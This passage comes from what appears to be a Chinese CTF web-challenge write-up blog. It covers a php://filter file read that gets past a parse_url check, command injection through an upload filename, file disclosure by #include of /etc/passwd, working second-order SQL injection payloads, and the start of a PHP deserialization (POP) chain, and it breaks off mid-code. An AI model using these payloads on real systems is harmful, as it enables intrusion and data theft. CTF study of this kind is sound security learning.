<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看ffffllllaaaaggg，发现被过滤了<br><code>/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code><br>但是parse_url解析漏洞，当url种出现下面这种情况的url，会解析错误，返回false<br><code>//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code><br>读取到这个文件了</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif (FLAG_SIG !&#x3D; 1)&#123;    die(&quot;you can not visit it directly&quot;);&#125;else &#123;    echo &quot;you can find sth in m4aaannngggeee&quot;;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续查看m4aaannngggeee</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif (FLAG_SIG !&#x3D; 1)&#123;    die(&quot;you can not visit it directly&quot;);&#125;include &quot;templates&#x2F;upload.html&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>去看看upload.html，再转回upllloadddd.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//upllloadddd.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/png;base64,"</span><span class="token operator">.</span><span class="token variable">$picdata</span><span class="token operator">.</span><span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这没有任何过滤，直接修改文件名就能执行系统命令</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011611789.png"></p>        <h2 id="FireshellCTF2020-Caas"   >          <a href="#FireshellCTF2020-Caas" class="heading-link"><i class="fas fa-link"></i></a><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2>      <p>试了试php和python代码，都编译失败，各种编程语言都尝试一下发现是C的编译器，你好世界试试</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main() &#123;    printf(&quot;Hello, World! \n&quot;);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看wp知道是头文件包含报错，试试/etc/passwd，有回显</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011632778.png"></p><p>直接包含flag拿到</p>        <h2 id="October-2019-Twice-SQL-Injection"   >          <a href="#October-2019-Twice-SQL-Injection" class="heading-link"><i class="fas fa-link"></i></a><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2>      <p>题目名字很明显了，二次注入，注入点在username处</p><pre class="line-numbers language-none"><code class="language-none">kkk&#39; union select database() #rua&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; #kkk&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;#kkk&#39; union select flag from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做完可以看看源码语句被构造成了什么样</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">插入<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"insert into users(username,password,info) values ('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>','十月太懒，没有简介');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?action=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>取出<span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select info from users where username='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到从数据库中取出info数据的时候并没有对username进行addslash处理，会导致查询的是kkk这个用户的信息，但是我们并没有注册过这个用户，导致后面的union select执行，产生了二次注入漏洞</p>        <h2 id="EIS-2019-EzPOP"   >          <a href="#EIS-2019-EzPOP" class="heading-link"><i class="fas fa-link"></i></a><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2>      <p>上来就给了源码，不错<del>不错个毛线啊md这什么玩意啊！！！！！！！！！</del></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string single-quoted-string">'path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'basename'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'size'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'visibility'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这个函数反转数组中所有的键以及它们关联的值，原来是1->path，现在是path->1</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此处比较两个数组的键名，并返回交集</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//传入了cache变量，而我们这里发现并没有cache这个变量，所以这个需要后续把变量定义传值</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//看到返回值被json_encode</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>、        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里set函数在B类中存在，到后面再审计</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//明显这里就是反序列化头了</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span> <span class="token punctuation">&#123;</span><span class="token comment">//这边返回的是int参数</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span><span class="token comment">//拼接字符串</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span><span class="token comment">//反正就是把所有内容经过options['serialize']名称函数转换了</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token 